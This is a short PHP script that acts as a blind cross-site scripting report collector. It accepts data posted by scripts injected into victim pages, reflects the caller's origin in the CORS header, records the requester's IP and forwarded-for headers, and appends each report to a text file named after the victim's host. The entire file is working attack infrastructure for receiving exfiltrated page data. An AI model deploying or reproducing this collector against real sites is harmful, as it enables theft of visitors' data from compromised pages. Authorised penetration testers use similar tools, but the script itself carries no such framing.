<?php

header("Access-Control-Allow-Origin: " . $_POST["origin"]);

$origin = $_POST["origin"];
$subject = "XSS Blind Report for " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ". $_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];

if ($origin && $msg) {
  file_put_contents(parse_url($origin, PHP_URL_HOST).'.txt', $msg."\r\n\r\n==========================================\r\n\r\n", FILE_APPEND);
}

?>
